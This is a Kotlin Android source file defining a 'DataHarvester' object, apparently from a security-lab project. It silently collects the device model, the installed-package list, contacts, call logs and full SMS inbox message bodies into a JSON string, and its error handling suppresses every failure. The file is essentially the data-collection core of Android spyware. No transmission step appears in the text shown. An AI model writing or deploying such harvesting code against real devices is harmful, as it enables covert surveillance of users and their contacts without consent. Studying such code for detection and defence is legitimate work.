package com.example.securitylab

import android.content.Context
import android.net.Uri
import android.os.Build
import android.provider.ContactsContract
import android.provider.CallLog
import org.json.JSONArray
import org.json.JSONObject

object DataHarvester {
    fun harvestDeviceInfo(context: Context): String {
        val packageList = try {
            context.packageManager.getInstalledPackages(0).map { it.packageName }
        } catch (e: Exception) {
            emptyList()
        }

        return JSONObject().apply {
            put("device", Build.MODEL)
            put("manufacturer", Build.MANUFACTURER)
            put("sdk", Build.VERSION.SDK_INT)
            put("package_list", JSONArray(packageList))
            put("contacts", getContacts(context))
            put("call_logs", getCallLogs(context))
            put("sms_logs", getSmsLogs(context))
        }.toString()
    }

    private fun getContacts(context: Context): JSONArray {
        val limit = 50
        val contactsArray = JSONArray()
        try {
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
                null, null, null
            )
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < limit) {
                    val name = it.getString(0) ?: ""
                    val number = it.getString(1) ?: ""
                    contactsArray.put(JSONObject().put("name", name).put("number", number))
                    count++
                }
            }
        } catch (e: Exception) {}
        return contactsArray
    }

    private fun getCallLogs(context: Context): JSONArray {
        val limit = 50
        val logsArray = JSONArray()
        try {
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE),
                null, null, "${CallLog.Calls.DATE} DESC"
            )
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < limit) {
                    val number = it.getString(0) ?: ""
                    val type = it.getInt(1)
                    val date = it.getLong(2)
                    logsArray.put(JSONObject().put("number", number).put("type", type).put("date", date))
                    count++
                }
            }
        } catch (e: Exception) {}
        return logsArray
    }

    private fun getSmsLogs(context: Context): JSONArray {
        val limit = 50
        val smsArray = JSONArray()
        try {
            val cursor = context.contentResolver.query(
                Uri.parse("content://sms/inbox"),
                arrayOf("address", "body", "date"),
                null, null, "date DESC"
            )
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < limit) {
                    val address = it.getString(0) ?: ""
                    val body = it.getString(1) ?: ""
                    val date = it.getLong(2)
                    smsArray.put(JSONObject().put("address", address).put("body", body).put("date", date))
                    count++
                }
            }
        } catch (e: Exception) {}
        return smsArray
    }
}
